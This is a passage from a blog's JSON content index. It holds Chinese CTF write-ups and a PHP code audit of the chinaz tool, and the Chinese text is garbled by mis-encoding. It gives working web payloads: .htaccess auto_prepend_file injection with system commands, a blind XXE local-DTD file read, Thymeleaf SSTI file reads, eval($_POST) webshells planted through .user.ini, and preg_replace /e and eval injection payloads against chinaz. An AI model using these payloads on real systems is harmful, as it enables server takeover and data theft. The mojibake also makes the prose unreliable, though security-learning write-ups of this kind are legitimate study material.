ç®€å•åˆ†æï¼Œå…ˆåˆ—å‡ºå½“å‰æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼Œåˆ é™¤é™¤index.phpå¤–çš„æ–‡ä»¶ï¼ŒåŒ…å«ä¸€ä¸ªfl3g.phpï¼Œä¼ å‚ï¼Œå¯¹æ–‡ä»¶åå’Œæ–‡ä»¶å†…å®¹åˆ†åˆ«æœ‰ä¸€ä¸ªpreg_match()å’Œstristr()è¿‡æ»¤ï¼Œå†åˆ é™¤ä¸€æ¬¡æ–‡ä»¶ï¼Œæœ€åfile_put_contents()ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„åˆ©ç”¨ç‚¹ è¿™é‡Œè®°å½•ä¸‹æœ€ç®€å•ã€æœ€å®¹æ˜“ç†è§£çš„ä¸€ç§æ–¹æ³•ï¼Œ.htaccesså’Œ.user.iniéƒ½æ”¯æŒåœ¨å¼€å¤´æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯ç”Ÿæ•ˆçš„æ¡ä»¶ä¸åŒ ç”¨\\nç»•è¿‡stristrçš„æ£€æµ‹ï¼Œæ–‡ä»¶åç”¨.htaccessï¼ˆä¸»è¦æ˜¯è¿™é‡Œä¸æ”¯æŒ.user.iniï¼Œéœ€è¦cgi/fcgiæ¨¡å¼ï¼‰ï¼Œpreg_match()å°±ä¸éœ€è¦ç»•è¿‡ï¼Œå¹¶ä¸”ç†è®ºä¸Šæˆ‘ä»¬å†™çš„æ˜¯å¼€å¤´è‡ªåŠ¨åŒ…å«ï¼Œä¼šåœ¨åˆ é™¤å‰æ‰§è¡Œæˆ‘ä»¬åŒ…å«çš„é©¬ æ„é€  12?content&#x3D;php_value%20auto_prepend_fil\\%0ae%20.htaccess%0a%23&lt;?php%20system(&#39;cat%20&#x2F;fla&#39;.&#39;g&#39;);?&gt;\\&amp;filename&#x3D;.htaccess ï¼Œé‚£ä¹ˆå†™å…¥.htaccessçš„å†…å®¹ä¸º 1234php_value auto_prepend_fil\\e .htaccess#&lt;?php system(&#39;cat &#x2F;fla&#39;.&#39;g&#39;);?&gt;\\Just one chance","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"ogeek-web","slug":"ogeek-web","date":"2019-08-27T09:17:42.000Z","updated":"2020-03-31T00:35:20.128Z","comments":true,"path":"2019/08/27/ogeek-web/","link":"","permalink":"https://glotozz.github.io/2019/08/27/ogeek-web/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• LookAround render Easy Realworld Chanllenge Enjoy You Self å‚è€ƒé“¾æ¥ LookAroundxxeç›²æ³¨ã€‚blind xxeæ€æƒ³å°±æ˜¯å°†æ•°æ®é€šè¿‡å¤–éƒ¨æœåŠ¡å™¨æˆ–è€…æŠ¥é”™ä¿¡æ¯å¸¦å‡ºæ¥ é¦–å…ˆå°è¯•httpåè®®ï¼Œå‘ç°è®¿é—®ä¸äº†å¤–éƒ¨æœåŠ¡å™¨ï¼Œä¼šå‡ºç°è¶…æ—¶çš„æƒ…å†µ é‚£ä¹ˆå°±åªèƒ½æ˜¯æœ¬åœ°dtdæŠ¥é”™æ•°æ®å¸¦å‡ºæ•°æ® éœ€è¦æœ¬åœ°dtdçš„ç»å¯¹è·¯å¾„ï¼Œç»™å‡ºäº†é•œåƒåï¼Œ å‘ç°/usr/share/xml/fontconfig/fonts.dtdæ˜¯æ­£ç¡®çš„ æ„é€  1234567891011121314&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;xml&#x2F;fontconfig&#x2F;fonts.dtd&quot;&gt; &lt;!ENTITY % expr &#39;aaa)&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa (bb&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt; renderæ˜¯javaçš„sstiï¼Œé”™è¯¯å›æ˜¾æ˜¯Spring bootçš„ 1&#123;&quot;content&quot;:&quot;$&#123;1+1&#125;&quot;&#125; å‘ç°ä¸è¡Œï¼ŒSpring bootå¸¸ç”¨çš„å‡ æŠŠæ¢­ï¼Œwpé‡Œè¯´æ˜¯Thymeleaf 1[[$&#123;1+1&#125;]] å‘ç°å¯ä»¥ï¼Œç„¶åæ„é€ è¯»æ–‡ä»¶ï¼ŒæŒ‰è¡Œ 1&#123;&quot;content&quot;:&quot;[[$&#123;new java.io.BufferedReader(new java.io.FileReader(\\&quot;&#x2F;flag\\&quot;)).readLine()&#125;]]&quot;&#125; å¾—åˆ°flag Easy Realworld Chanllengeå…ˆç”¨telnet://172.18.0.3:21è¿æ¥ï¼Œè´¦å·å¯†ç æ˜¯å¼±å£ä»¤ctfã€ctf PASVã€ç„¶åè®¡ç®—ä¸€ä¸‹ç«¯å£ ç„¶åç”¨è®¡ç®—å‡ºçš„ç«¯å£è¿æ¥ æˆ‘ä¸å°å¿ƒæŒ‰äº†æœ€ä¸‹é¢çš„ç±»ä¼¼æ’­æ”¾çš„å›¾æ ‡ï¼Œå¯¼è‡´ä¸€éƒ¨åˆ†æ“ä½œçœ‹ä¸è§äº†ã€‚ã€‚ã€‚ Enjoy You Selfè¿™é‡Œå…ˆæ£€æŸ¥äº† filename æ˜¯ä¸æ˜¯å…«ä½ï¼ˆåŒ…æ‹¬ä¸‹åˆ’çº¿åœ¨å†…çš„ä»»ä½•å­—å­—ç¬¦ [A-Za-z0-9_]ï¼‰ã€‚æ˜¯çš„è¯å°±åˆ›å»ºä¸€ä¸ªè¿™ä¸ªåå­—çš„æ–‡ä»¶ã€‚åˆ é™¤åˆ—å‡ºçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ã€‚è€Œæ–‡ä»¶æ ¹æ®æ–‡ä»¶åçš„å­—ç¬¦é›†æ’åºï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬çš„æ–‡ä»¶æ²¡è¢«åˆ æ‰ï¼Œè¯´æ˜åŸæ¥å­˜åœ¨çš„æ–‡ä»¶åæ¯”æˆ‘ä»¬çš„å° è„šæœ¬å°±å…ˆä¸è´´äº†ï¼Œä¹Ÿæ²¡ç¯å¢ƒã€‚ã€‚ã€‚ ç„¶åå±…ç„¶è¿˜æœ‰å¨ƒé¢˜ è¿™ä¸ªæ–‡ä»¶æ˜¯ä¸ªä¸‹è½½å™¨ï¼Œå¯ä»¥æŠŠè¿œç¨‹æœåŠ¡å™¨çš„ä¸œè¥¿ä¸‹è½½åˆ°è¿™ä¸ªæœåŠ¡å™¨ä¸Šã€‚åœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åæŠŠæ‰€æœ‰è®¿é—®éƒ½é‡å†™åˆ°è¿™ä¸ªæ–‡ä»¶ã€‚ è¿™é‡Œéƒ½æ˜¯å‚è€ƒzhaojinå¸ˆå‚…çš„ï¼Œæ€è·¯å¾ˆæ¸…æ¥šğŸ‘ ä¸¾ä¸ªæ —å­ 123&lt;?php header(&#39;Content-Type:glotozz&#x2F;php&#x2F;.&#39;); echo &#39;&lt;?php eval($_POST[cmd]); ?&gt;&#39;; å†å†™ä¸ªglotozz/glotozz.txt 123&lt;?php header(&#39;Content-Type:glotozz&#x2F;txt&#39;); echo &#39;&lt;?php eval($_POST[cmd]); ?&gt;&#39;; å†å†™ä¸ª.user.ini 123&lt;?php header(&#39;Content-Type:..&#x2F;.&#x2F;.user.ini&#39;); echo &#39;auto_prepend_file &#x3D; &#x2F;var&#x2F;www&#x2F;html&#x2F;users&#x2F;xxxxx&#x2F;uploads&#x2F;glotozz&#x2F;glotozz.txt&#39;; æœ€åï¼Œéœ€è¦ç”¨è„šæœ¬ä¸Šä¼ ï¼Œå› ä¸ºæ¸…ç†çš„æ¯”è¾ƒå¿« å‚è€ƒé“¾æ¥https://www.zhaoj.in/read-6251.html?tdsourcetag=s_pctim_aiomsg https://www.freebuf.com/vuls/207639.html","categories":[],"tags":[]},{"title":"chinazçš„ä»£ç æ‰§è¡Œå’Œå‘½ä»¤æ‰§è¡Œæ¼æ´","slug":"chinazçš„ä»£ç æ‰§è¡Œå’Œå‘½ä»¤æ‰§è¡Œæ¼æ´","date":"2019-08-13T04:57:44.000Z","updated":"2020-04-02T03:00:55.275Z","comments":true,"path":"2019/08/13/chinazçš„ä»£ç æ‰§è¡Œå’Œå‘½ä»¤æ‰§è¡Œæ¼æ´/","link":"","permalink":"https://glotozz.github.io/2019/08/13/chinaz%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ç®€å•åˆ†æ æ¼æ´ä¸€ æ¼æ´äºŒ æ¼æ´ä¸‰ ç®€å•åˆ†æindex.php indexé¡µé¢é€šè¿‡pageå‚æ•°è°ƒç”¨ä¸åŒåŠŸèƒ½çš„phpé¡µé¢ library/view.phpå…ˆåˆå§‹åŒ–Viewç±» è·Ÿè¸ªechoContent() å…ˆåŠ è½½ä¸€ä¸ªåˆå§‹åŒ–æ¨¡ç‰ˆæ–‡ä»¶ï¼Œé»˜è®¤ä¸ºjsï¼Œç»è¿‡ä¸‰æ¬¡æ¨¡ç‰ˆè§£æï¼Œè¿™é‡Œä»¥ç¬¬ä¸€ä¸ªï¼Œä¹Ÿæ˜¯æœ€ç®€å•çš„parseHeadAndFoot()ä¸ºä¾‹ å¾ˆç®€å•ï¼Œå°±æ˜¯å°†{chinaz:header}ç”¨å‡†å¤‡å¥½çš„æ–‡ä»¶å†…å®¹æ›¿æ¢ action.php å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯å­˜åœ¨åç¼€.phpï¼Œç»è¿‡filterè¿‡æ»¤ï¼Œè·Ÿè¸ª å°† . è¿‡æ»¤æˆç©ºï¼Œæ–‡ä»¶åŒ…å«è·¯å¾„ä¸­ä¸èƒ½æœ‰ . å¯¼è‡´æ— æ³•ä½¿ç”¨ç›¸å¯¹è·¯å¾„ é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç»å¯¹è·¯å¾„è¿›è¡ŒåŒ…å«ã€‚ å¯ä»¥åŒ…å«å¸¸è§é‡è¦æ–‡ä»¶æˆ–æ—¥å¿—æ–‡ä»¶ æ¼æ´ä¸€æœç´¢write common.php å­˜åœ¨æ–‡ä»¶å†™å…¥ï¼Œæœç´¢è°ƒç”¨ å½“è®¿é—®ä¸å­˜åœ¨çš„é¡µé¢æ—¶ï¼Œå†™å…¥$filePathåˆ°logs/logfile.phpä¸­ é‚£ä¹ˆæ„é€ payloadï¼š 1?page&#x3D;&lt;?php phpinfo();?&gt; è®¿é—®ï¼š 1&#x2F;logs&#x2F;logfile.php å¦‚æœæ²¡æœ‰ç›´æ¥è®¿é—®æƒé™ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨action.phpä¸­çš„æ–‡ä»¶åŒ…å«ï¼Œ å¹¶ä¸”å¯ä»¥çœ‹åˆ°phpinfoä¸­ï¼Œå› æ­¤æ— æ³•è¿œç¨‹æ–‡ä»¶åŒ…å« æ¼æ´äºŒæœç´¢preg_replace( normaliz.php preg_replace()çš„æ­£åˆ™å¦‚æœåŠ äº†eè¿™ä¸ªé€‰é¡¹ï¼Œä¼šæŠŠæ­£åˆ™è¡¨è¾¾å¼æ›¿æ¢çš„éƒ¨åˆ†æ›¿æ¢ä¹‹åçš„å†…å®¹æ‰§è¡Œä¸€ä¸‹ï¼Œç„¶åå°†æ‰§è¡Œå®Œçš„ç»“æœæ”¾å…¥éœ€è¦è¢«æ›¿æ¢çš„ä½ç½® ä½†æ˜¯php7.0.0å¼€å§‹ï¼Œä¸å†æ”¯æŒ/eä¿®é¥°ç¬¦ï¼Œè¯·ç”¨preg_replace_callback()ä»£æ›¿ è€Œä¸”ä»å‰é¢çš„phpinfoå¾—çŸ¥æˆ‘ä»¬çš„PHPç‰ˆæœ¬æ˜¯7.3.4ğŸ¤¦â€ é‚£ä¹ˆæˆ‘æŠŠphpç‰ˆæœ¬æ”¹æˆphp5.4.45 è¿½è¸ª$post_dataï¼Œ action.php æ‰€ä»¥æˆ‘ä»¬éœ€è¦è®¿é—®action.phpå†åˆ©ç”¨$pageå˜é‡åŒ…å«normaliz æ„é€  1234http:&#x2F;&#x2F;127.0.0.1&#x2F;chinaz&#x2F;action.phpPOST:page&#x3D;normaliz&amp;method&#x3D;&#x2F;a&#x2F;e&amp;mail_replacement&#x3D;phpinfo()&amp;source&#x3D;a å°±ç›¸å½“äº 1preg_replace(&quot;&#x2F;a&#x2F;e&quot;,&quot;phpinfo()&quot;,&quot;a&quot;); æ¼æ´ä¸‰æœç´¢eval( view.php åŸºæœ¬ä¸Šæ¯ä¸ªé¡µé¢éƒ½å­˜åœ¨æ¨¡ç‰ˆæ¸²æŸ“ï¼Œé‚£ä¹ˆè¿™é‡Œä»¥md5.phpä¸ºä¾‹ å¾ˆæ˜æ˜¾è¿™é‡Œåªè¦ä¸ä¼ å…¥$methodï¼Œ$reså°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„å€¼ æˆ‘ä»¬å…ˆç®€å•æ„é€ ï¼Œå…ˆè°ƒè¯•ä¸‹çœ‹çœ‹ 1234http:&#x2F;&#x2F;127.0.0.1&#x2F;chinaz&#x2F;action.phpPOST:page&#x3D;md5&amp;res&#x3D;123 å°è¯•æ„é€  12345@eval(&quot;if(&quot;.$strIf.&quot;)&#123;&#125;&#123;&#125;&quot;);&#x3D;&gt;@eval(&quot;if(\\&quot;\\&quot; or phpinfo() or \\&quot;\\&quot;&#x3D;&#x3D;\\&quot;\\&quot;)&#123;&#125;&#123;&#125;&quot;);&#x3D;&gt;&quot; or phpinfo() or &quot; ç±»ä¼¼çš„payload 12POST:page&#x3D;md5&amp;res&#x3D;&quot;or @eval($_POST[addd])or &quot;&amp;addd&#x3D;phpinfo(); å¤§è‡´å¦‚ä¸‹ 1@eval(&quot;if(\\&quot;\\&quot;or @eval(\\&quot;phpinfo();\\&quot;)or \\&quot;\\&quot;&#x3D;&#x3D;\\&quot;\\&quot;)&#123;&#125;else&#123;&#125;&quot;);","categories":[],"tags":[{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç å®¡è®¡","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]}]}